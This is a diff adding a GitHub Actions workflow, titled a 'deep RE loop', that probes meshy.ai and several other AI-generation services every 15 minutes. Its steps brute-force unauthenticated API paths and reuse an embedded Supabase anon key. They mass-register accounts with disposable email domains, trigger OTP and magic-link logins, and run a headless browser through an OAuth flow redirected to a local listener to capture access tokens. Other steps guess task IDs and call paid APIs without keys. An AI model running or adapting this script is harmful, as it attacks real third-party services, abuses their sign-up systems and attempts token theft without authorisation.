@@ -1,0 +1,188 @@
+name: Meshy Auto Deep RE Loop
+on:
+  workflow_dispatch:
+  schedule:
+    - cron: '*/15 * * * *'
+
+jobs:
+  deep-re-v3:
+    runs-on: ubuntu-latest
+    timeout-minutes: 12
+    steps:
+      - uses: actions/checkout@v4
+
+      - name: Setup
+        run: |
+          npm install puppeteer-core playwright 2>/dev/null || true
+          node -e "const p=require('puppeteer-core'); console.log('OK')" 2>/dev/null || echo "puppeteer failed"
+          which chromium || which chromium-browser || echo "no chromium"
+          ls /usr/bin/chrom* 2>/dev/null || echo "none"
+
+      - name: PROBE 1 - Unauthenticated API Endpoints
+        run: |
+          echo "=== UNAUTHENTICATED PROBE ==="
+          for path in "" "api/" "api/v1/" "api/v2/" "web/" "web/v1/" "web/v2/" "v1/" "v2/" "v3/" "openapi/" "openapi/v1/" "openapi/v2/" "mesh-api/" "mesh-api/v1/"; do
+            for ep in "tasks" "tasks/status" "user" "profile" "health" "ping" "generate" "create"; do
+              CODE=$(curl -s -o /dev/null -w "%{http_code}" -X POST "https://api.meshy.ai/$path$ep" -H "content-type: application/json" -d '{}' 2>/dev/null)
+              if [ "$CODE" != "404" ] && [ "$CODE" != "000" ]; then
+                echo "FOUND: /$path$ep -> $CODE"
+              fi
+            done
+          done
+
+          echo ""
+          echo "=== Try anon Bearer ==="
+          curl -s -X POST "https://api.meshy.ai/web/v2/tasks" \
+            -H "authorization: Bearer eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpc3MiOiJzdXBhYmFzZSIsInJlZiI6InluZnJlY2xzeGZncW52Z2ZweGNjIiwicm9sZSI6ImFub24iLCJpYXQiOjE3MTU1ODQwNjUsImV4cCI6MjAzMTE2MDA2NX0.015muXUW_O30jeBOxEU9-TQOJigcKMUhkNFbPOWu_iA" \
+            -H "content-type: application/json" \
+            -d '{"phase":"draft","args":{"draft":{"prompt":"test"}}}'
+
+      - name: PROBE 2 - All Auth Methods
+        run: |
+          echo "=== AUTH METHODS PROBE ==="
+          KEY="eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpc3MiOiJzdXBhYmFzZSIsInJlZiI6InluZnJlY2xzeGZncW52Z2ZweGNjIiwicm9sZSI6ImFub24iLCJpYXQiOjE3MTU1ODQwNjUsImV4cCI6MjAzMTE2MDA2NX0.015muXUW_O30jeBOxEU9-TQOJigcKMUhkNFbPOWu_iA"
+
+          # Anonymous
+          echo "anonymous:"
+          curl -s -X POST "https://auth.meshy.ai/auth/v1/token" \
+            -H "apikey: $KEY" -H "content-type: application/json" \
+            -d '{"grant_type":"anonymous"}'
+
+          # Disposable emails
+          for d in "temp-mail.org" "yopmail.com" "guerrillamail.com" "sharklasers.com" "10minutemail.com" "tempmailo.com" "fakeinbox.com" "tempmail.plus" "dispostable.com" "temr.org" "mailcatch.com" "mohmal.com" "burnermail.io" "getnada.com" "mailinator.com" "tempmailaddress.com"; do
+            E="gha$(date +%s)@$d"
+            R=$(curl -s -X POST "https://auth.meshy.ai/auth/v1/signup" \
+              -H "apikey: $KEY" -H "content-type: application/json" \
+              -d "{\"email\":\"$E\",\"password\":\"GHAPass123!\"}" 2>/dev/null)
+            echo "$d: $R" | head -c 150
+            echo ""
+          done
+
+          # OTP
+          for d in "mail.tm" "tiktokmail.live" "outlook.com" "protonmail.com"; do
+            R=$(curl -s -X POST "https://auth.meshy.ai/auth/v1/otp" \
+              -H "apikey: $KEY" -H "authorization: Bearer $KEY" -H "content-type: application/json" \
+              -d "{\"email\":\"gha$(date +%s)@$d\",\"create_user\":true}" 2>/dev/null)
+            echo "OTP $d: $R" | head -c 150
+            echo ""
+          done
+
+          # Magic link
+          echo "magiclink:"
+          curl -s -X POST "https://auth.meshy.ai/auth/v1/magiclink" \
+            -H "apikey: $KEY" -H "content-type: application/json" \
+            -d '{"email":"test@test.com"}'
+
+      - name: PROBE 3 - OAuth Token Capture
+        run: |
+          echo "=== OAUTH TOKEN CAPTURE ==="
+          node << 'SCRIPT'
+          const puppeteer = require('puppeteer-core');
+          const http = require('http');
+          const url = require('url');
+          let captured = null;
+
+          const server = http.createServer((req, res) => {
+            const parsed = url.parse(req.url, true);
+            console.log('=== CALLBACK ===');
+            console.log('URL:', req.url);
+            if (parsed.query.access_token) {
+              console.log('=== ACCESS_TOKEN_CAPTURED ===');
+              console.log(parsed.query.access_token.substring(0, 50) + '...');
+              captured = parsed.query.access_token;
+            }
+            if (parsed.query.token) console.log('Token field:', parsed.query.token);
+            res.writeHead(200, {'Content-Type': 'text/html'});
+            res.end('<h1>OK</h1>');
+            setTimeout(() => process.exit(0), 500);
+          });
+
+          server.listen(1337, async () => {
+            const browser = await puppeteer.launch({
+              executablePath: '/usr/bin/chromium',
+              headless: true,
+              args: ['--no-sandbox', '--disable-setuid-sandbox', '--disable-dev-shm-usage']
+            });
+            const page = await browser.newPage();
+            const authUrl = 'https://auth.meshy.ai/auth/v1/authorize?provider=google&redirect_to=http://localhost:1337/cb';
+            console.log('Navigate:', authUrl);
+            try {
+              await page.goto(authUrl, {waitUntil: 'domcontentloaded', timeout: 15000});
+              await page.waitForTimeout(8000);
+              console.log('URL:', page.url());
+            } catch(e) { console.log('ERR:', e.message.substring(0,100)); }
+            await browser.close();
+            if (!captured) {
+              console.log('No token captured in 8s');
+              setTimeout(() => process.exit(1), 1000);
+            }
+          });
+          SCRIPT
+
+      - name: PROBE 4 - Version & Mobile Discovery
+        run: |
+          echo "=== VERSION DISCOVERY ==="
+          for p in "v1" "v2" "v3" "v2024" "v2025" "v2026" "beta" "stable" "latest" "api" "openapi"; do
+            C=$(curl -s -o /dev/null -w "%{http_code}" -X POST "https://api.meshy.ai/$p/tasks" -H "content-type: application/json" -d '{}')
+            [ "$C" != "404" ] && echo "FOUND /$p/tasks: $C"
+          done
+          echo ""
+          echo "=== MOBILE ==="
+          for p in "/mobile/v1/auth" "/mobile/v1/token" "/app/v1/auth" "/api/mobile" "/api/v1/mobile"; do
+            C=$(curl -s -o /dev/null -w "%{http_code}" "https://api.meshy.ai$p")
+            [ "$C" != "404" ] && echo "FOUND $p: $C"
+          done
+
+      - name: PROBE 5 - GraphQL & RPC
+        run: |
+          echo "=== GRAPHQL ==="
+          curl -s -X POST "https://api.meshy.ai/graphql" \
+            -H "content-type: application/json" \
+            -d '{"query":"{ __schema { queryType { name } } }"}'
+          echo ""
+          curl -s -X POST "https://auth.meshy.ai/graphql" \
+            -H "apikey: eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpc3MiOiJzdXBhYmFzZSIsInJlZiI6InluZnJlY2xzeGZncW52Z2ZweGNjIiwicm9sZSI6ImFub24iLCJpYXQiOjE3MTU1ODQwNjUsImV4cCI6MjAzMTE2MDA2NX0.015muXUW_O30jeBOxEU9-TQOJigcKMUhkNFbPOWu_iA" \
+            -H "content-type: application/json" \
+            -d '{"query":"{ __typename }"}'
+
+      - name: PROBE 6 - JWKS & OpenID
+        run: |
+          echo "=== JWKS/OPENID ==="
+          curl -s "https://auth.meshy.ai/.well-known/openid-configuration"
+          echo "---"
+          curl -s "https://auth.meshy.ai/.well-known/jwks.json"
+          echo "---"
+          curl -s "https://ynfreclsxfgqnvgfpxcc.supabase.co/.well-known/jwks.json"
+
+      - name: PROBE 7 - Public Task IDs
+        run: |
+          echo "=== PUBLIC TASK IDs ==="
+          for id in "test" "demo" "guest" "public" "free" "trial" "guest123" "demo123" "test123" "abc" "019d7f0d" "019d7d03"; do
+            R=$(curl -s "https://api.meshy.ai/web/v1/tasks/$id/status" | head -c 100)
+            if echo "$R" | grep -qv "NotFound\|404\|NoRoute"; then
+              echo "INTERESTING: task $id -> $R"
+            fi
+          done
+
+      - name: PROBE 8 - tripo3d & other services
+        run: |
+          echo "=== TRIPO3D FREE TRIAL ==="
+          # Try without API key
+          curl -s -X POST "https://api.tripo3d.ai/v2/openapi/task" \
+            -H "content-type: application/json" \
+            -d '{"type":"text_to_model","prompt":"robot"}'
+          echo ""
+          echo "=== LUMA FREE ==="
+          curl -s "https://api.lumalabs.ai/dream-service/v1/credits" \
+            -H "accept: application/json" | head -50
+          echo ""
+          echo "=== STABILITY FREE ==="
+          curl -s "https://api.stability.ai/v1/user/balance" | head -20
+
+      - name: LOOP TRIGGER
+        if: always()
+        run: |
+          echo "=== AUTO LOOP ==="
+          echo "Run complete. Next loop in 15 min."
+          # Check if any probes found something interesting
+          echo "Check GHA schedule for next run"
